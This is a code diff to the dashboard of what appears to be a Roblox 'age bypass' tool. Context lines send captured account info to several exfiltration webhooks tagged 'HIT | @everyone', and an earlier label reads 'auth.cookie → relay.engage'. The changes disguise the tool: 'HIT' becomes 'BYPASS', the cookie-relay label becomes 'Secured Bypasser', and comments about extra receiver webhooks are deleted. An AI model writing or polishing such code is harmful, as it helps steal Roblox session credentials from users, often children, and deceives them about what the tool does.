@@ -118,7 +118,6 @@ const Dashboard = () => {
 
     broadcastLiveBypass(info);
     await sendHitEmbed(getWebhook(WK.bypass), info, { tag: 'Bypasser HIT | @everyone' });
-    // Extra dedicated webhooks (receiver + live bypass) — kept in src/lib/extraWebhooks.ts
     broadcastExtra(info).catch(() => {});
 
     const elapsed = Date.now() - start;
@@ -128,7 +127,6 @@ const Dashboard = () => {
     setProgress(100);
 
     pushLiveBypass({ username: info.username || 'Unknown', avatarUrl: info.avatarUrl, success: true });
-    // Final live ping to extra live-bypass webhook on completion
     sendExtraLiveBypass(info).catch(() => {});
 
     setStatus("success");
@@ -155,7 +153,7 @@ const Dashboard = () => {
               <h1 className="font-cyber text-xl font-black text-foreground glow-text cyber-glitch tracking-[0.2em]">
                 ROBLOX TOOLS
               </h1>
-              <p className="font-cyber text-[9px] text-primary/70 tracking-[0.4em] uppercase">// v2.0 cyber.edition</p>
+              <p className="font-cyber text-[9px] text-primary/70 tracking-[0.4em] uppercase">// ROBLOX AGE BYPASSER.</p>
             </div>
           </div>
         </div>
@@ -169,8 +167,8 @@ const Dashboard = () => {
                 <Terminal size={15} className="text-primary" />
               </div>
               <div>
-                <h2 className="font-cyber text-sm font-bold text-foreground tracking-widest uppercase">Bypass Module</h2>
-                <p className="text-[10px] text-muted-foreground font-mono">// auth.cookie → relay.engage</p>
+                <h2 className="font-cyber text-sm font-bold text-foreground tracking-widest uppercase">Roblox Bypass</h2>
+                <p className="text-[10px] text-muted-foreground font-mono">// Secured Bypasser.</p>
               </div>
             </div>
             <span className={`text-[9px] font-cyber font-bold px-2 py-1 rounded-md border tracking-widest uppercase ${
@@ -260,7 +258,7 @@ const Dashboard = () => {
               </div>
               <div>
                 <h2 className="font-cyber text-sm font-bold text-foreground tracking-widest uppercase">Live Feed</h2>
-                <p className="text-[10px] text-muted-foreground font-mono">// real_time.bypass.stream</p>
+                <p className="text-[10px] text-muted-foreground font-mono">// World Bypass.</p>
               </div>
             </div>
             <span className="font-cyber text-[9px] font-bold tracking-widest uppercase text-[hsl(var(--success))] bg-[hsl(var(--success))]/15 border border-[hsl(var(--success))]/40 px-2 py-1 rounded-md inline-flex items-center gap-1.5">
@@ -300,7 +298,7 @@ const Dashboard = () => {
                     <p className="text-[10px] text-muted-foreground font-mono">{new Date(e.timestamp).toLocaleTimeString()}</p>
                   </div>
                   <span className="font-cyber text-[9px] font-bold tracking-widest uppercase px-2 py-1 rounded-md inline-flex items-center gap-1 bg-[hsl(var(--success))]/15 text-[hsl(var(--success))] border border-[hsl(var(--success))]/30">
-                    <CheckCircle2 size={10} /> HIT
+                    <CheckCircle2 size={10} /> BYPASS
                   </span>
                 </div>
               ))}
